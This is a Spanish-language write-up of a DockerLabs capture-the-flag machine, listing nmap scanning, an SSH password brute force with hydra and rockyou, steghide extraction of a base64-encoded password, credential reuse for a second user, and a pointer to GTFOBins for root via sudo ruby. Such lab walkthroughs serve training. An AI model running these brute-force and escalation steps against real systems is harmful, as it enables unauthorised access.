Fecha: 12/08/2024

Comienzo haciendo nmap, encontrando dos puertos abiertos con servicios no vulnerables:
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```


![](Imágenes/Pasted%20image%2020240812132611.png)

Accedo a la página desde el browser, encontrando el siguiente mensaje interesante:

![](Imágenes/Pasted%20image%2020240812132801.png)

Pruebo a acceder encontrar la contraseña de carlota con hydra, usando el diccionario `rockyou.txt`, que resulta ser `babygirl` 

```
sudo hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 
```

![](Imágenes/Pasted%20image%2020240812134830.png)

Me conecto por ssh y me encuentro un fichero, que paso a mi ordenador: 

```
scp ./Desktop/fotos/vacaciones/imagen.jpg pablo@192.168.1.63:/home/pablo/dockerlabs/amor
```

Utilizo exiftool, sin encontrar nada que me parezca de valor y posteriormente steghide, encontrando el siguiente texto : `ZXNsYWNhc2FkZXBpbnlwb24=`, que tiene pinta de estar escrito en base64. Lo decodifico, encontrando el texto `eslacasadepinypon`

```
steghide --extract -sf imagen.jpg
```


![](Imágenes/Pasted%20image%2020240812235022.png)
![](Imágenes/Pasted%20image%2020240812235204.png)
Compruebo si es la contraseña de su, pero no es el caso, así que sigo buscando información. Miro si puedo escalar privilegios con `sudo -l`, sin éxito. Compruebo si hay más carpetas en /home, y encuentro una llamada `oscar`. Pruebo la contraseña con ese usuario y veo que funciona. 
![](Imágenes/Pasted%20image%2020240812235548.png)

![](Imágenes/Pasted%20image%2020240812235435.png)

Haciendo `sudo -l` en oscar veo que puedo ejecutar `ruby` como superusuario. Busco en gtfobins y encuentro lo siguiente: https://gtfobins.github.io/gtfobins/ruby/#sudo

![](Imágenes/Pasted%20image%2020240812235731.png)

![](Imágenes/Pasted%20image%2020240812235742.png)
